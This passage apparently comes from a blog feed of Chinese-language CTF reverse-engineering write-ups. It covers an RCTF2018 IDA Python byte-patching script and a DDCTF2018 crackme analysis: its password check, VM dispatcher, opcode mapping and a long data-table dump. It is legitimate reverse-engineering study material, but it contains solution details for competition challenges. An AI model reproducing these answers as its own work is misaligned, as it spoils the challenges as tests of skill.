number">0x96</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> addr <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> data_addr <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#我这里data_addr = 0x60FD54</span>    idc<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> rc4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：</p><p><img src="/2023/04/07/rctf2018-magic/14.png"></p><p><img src="/2023/04/07/rctf2018-magic/15.png"></p><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1170775">https://cloud.tencent.com/developer/article/1170775</a></p><p><a href="https://www.52pojie.cn/thread-742361-1-1.html">https://www.52pojie.cn/thread-742361-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM逆向 </tag>
            
            <tag> setjmp/longjmp </tag>
            
            <tag> rc4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2018-黑盒破解</title>
      <link href="/2023/04/05/ddctf2018-hei-he-po-jie/"/>
      <url>/2023/04/05/ddctf2018-hei-he-po-jie/</url>
      
        <content type="html"><![CDATA[<p>目标：输出<code>Binggo</code>字符串；</p><p>题型：只给可执行程序，逆向emulator，构造opcode，读取flag</p><p>main函数基本逻辑：</p><ul><li>输入长度大于10的password，输入前10个字符只能是字母或者数字</li><li>password组成一个文件名，所以易知password=<code>48ee204317</code></li><li>接下来输入Passcode，其存储在(v4+16)地址处，长度小于100</li><li>然后进入一个Dispatcher函数中进行Passcode解析并执行相关函数</li><li>如果byte_603F00=1，则输出Success（但这里不是重点，因为题目要求是输出<code>Binggo</code>字符串即可</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/1.png" alt="1"></p><p>对byte_603F00交叉引用跟踪到sub_40113D函数</p><ul><li>可以看出，经过三个函数的check，最终byte_603F00才能为1</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/2.png"></p><p>对sub_40113D函数交叉引用跟踪失败，但是在数据段发现存储了很多函数的offset，可以猜测是VM逆向，Dispatcher则是分发该处的函数</p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/3.png"></p><p>查看main中byte_603F00上面的Dispatcher函数(经过分析得到的)</p><ul><li>相关操作看注释(其实最后一个if里面的逻辑可以判断是Dispatcher了</li><li>第一个for循环处理每个Passcode字符，第二个for循环查找Passcode字符对应的操作</li><li>我们输入的Passcode会当做byte_603900数组的下标，如果其该下标处byte_603900元素的值为9个opcode中的一个就会执行相关操作</li><li>也可以看汇编代码逻辑图，上面的jnz则是第二个for循环里面的if判断逻辑，最下面的call eax则是去调用对应的函数</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/4.png"></p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/5.png" alt="Dispatcher逻辑图"></p><p>在第二个for下断，动态调试，得出opcode，以及对应的v2下标</p><ul><li>对上面的汇编逻辑图简单分析一下，可以得出c1为我们输入v2下标，al为opcode</li></ul><p>将byte_603F00导出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byte_603F00 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>   <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span>   <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span>   <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span>   <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span>   <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span>   <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>   <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>   <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>   <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span>   <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>   <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span>   <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span>   <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>   <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span>   <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span>   <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>   <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>   <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span>   <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span 